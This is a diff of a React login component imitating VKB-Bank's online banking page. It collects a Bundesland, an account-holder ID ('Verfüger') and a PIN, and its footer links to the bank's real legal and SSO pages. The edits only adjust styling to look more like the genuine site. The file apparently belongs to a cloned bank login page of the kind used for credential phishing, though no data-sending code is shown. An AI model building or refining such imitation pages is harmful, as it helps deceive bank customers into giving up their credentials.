@@ -155,8 +155,8 @@ const Vkb = () => {
           <div
             onClick={() => setSelectOpen(!selectOpen)}
             onBlur={() => setBundeslandTouched(true)}
-            className={`w-full cursor-pointer border-b-2 px-3 pb-3 pt-5 text-base text-[#1a1a1a] outline-none ${
-              selectOpen ? "border-[#87da5a] bg-[#e8f5df]" : bundeslandTouched && !bundesland ? "border-red-600 bg-[#f4f4f4]" : "border-[#1a1a1a] bg-[#f4f4f4]"
+            className={`w-full cursor-pointer border-b-2 bg-[#f4f4f4] px-3 pb-3 pt-5 text-base text-[#1a1a1a] outline-none ${
+              selectOpen ? "border-[#87da5a]" : bundeslandTouched && !bundesland ? "border-red-600" : "border-[#1a1a1a]"
             }`}
           >
             {bundesland || "\u00A0"}
@@ -204,7 +204,7 @@ const Vkb = () => {
             onChange={(e) => setVerfueger(e.target.value)}
             onBlur={() => setVerfuegerTouched(true)}
             placeholder=" "
-            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-3 pt-5 text-base text-[#1a1a1a] outline-none focus:border-[#87da5a] focus:bg-[#e8f5df] ${
+            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-3 pt-5 text-base text-[#1a1a1a] outline-none focus:border-[#87da5a] ${
               verfuegerTouched && !verfueger ? "border-red-600" : "border-[#1a1a1a]"
             }`}
           />
@@ -228,7 +228,7 @@ const Vkb = () => {
             onChange={(e) => setPin(e.target.value)}
             onBlur={() => setPinTouched(true)}
             placeholder=" "
-            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-3 pt-5 text-base text-[#1a1a1a] outline-none focus:border-[#87da5a] focus:bg-[#e8f5df] ${
+            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-3 pt-5 text-base text-[#1a1a1a] outline-none focus:border-[#87da5a] ${
               pinTouched && !pin ? "border-red-600" : "border-[#1a1a1a]"
             }`}
           />
@@ -248,7 +248,7 @@ const Vkb = () => {
         <div className="flex justify-center">
           <button
             type="button"
-            className={`w-full md:w-auto rounded-md px-8 md:px-32 py-3 text-sm font-semibold text-[#1a1a1a] transition-colors ${
+            className={`w-full md:w-auto px-8 md:px-32 py-3 text-sm font-semibold text-gray-600 transition-colors ${
               isComplete ? "bg-[#87da5a] hover:bg-[#76c94a]" : "bg-[#98df71] cursor-not-allowed"
             }`}
             disabled={!isComplete}
@@ -278,10 +278,10 @@ const Vkb = () => {
 
       <footer className="hidden md:fixed md:block bottom-0 left-0 right-0 z-10 py-4">
         <div className="flex flex-wrap items-center justify-center gap-4 text-xs text-white/90">
-          <a href="https://www.vkb-bank.at/impressum" target="_blank" rel="noopener noreferrer" className="hover:underline inline-flex items-center gap-1">{t.impressum} <ExternalLink className="h-3 w-3" /></a>
-          <a href="https://www.vkb-bank.at/connect-nutzungsbedingungen" target="_blank" rel="noopener noreferrer" className="hover:underline inline-flex items-center gap-1">{t.nutzungsbedingungen} <ExternalLink className="h-3 w-3" /></a>
-          <a href="https://www.vkb-bank.at/connect" target="_blank" rel="noopener noreferrer" className="hover:underline inline-flex items-center gap-1">{t.barrierefreiheit} <ExternalLink className="h-3 w-3" /></a>
-          <a href="https://sso.vkb-bank.at/mein-login/identify" target="_blank" rel="noopener noreferrer" className="hover:underline">© 2026 VKB-Bank</a>
+          <a href="https://www.vkb-bank.at/impressum" target="_blank" rel="noopener noreferrer" className="underline decoration-black/50 hover:decoration-black decoration-1 underline-offset-2 inline-flex items-center gap-1">{t.impressum} <ExternalLink className="h-3 w-3" /></a>
+          <a href="https://www.vkb-bank.at/connect-nutzungsbedingungen" target="_blank" rel="noopener noreferrer" className="underline decoration-black/50 hover:decoration-black decoration-1 underline-offset-2 inline-flex items-center gap-1">{t.nutzungsbedingungen} <ExternalLink className="h-3 w-3" /></a>
+          <a href="https://www.vkb-bank.at/connect" target="_blank" rel="noopener noreferrer" className="underline decoration-black/50 hover:decoration-black decoration-1 underline-offset-2 inline-flex items-center gap-1">{t.barrierefreiheit} <ExternalLink className="h-3 w-3" /></a>
+          <a href="https://sso.vkb-bank.at/mein-login/identify" target="_blank" rel="noopener noreferrer" className="underline decoration-black/50 hover:decoration-black decoration-1 underline-offset-2">© 2026 VKB-Bank</a>
         </div>
       </footer>
     </div>
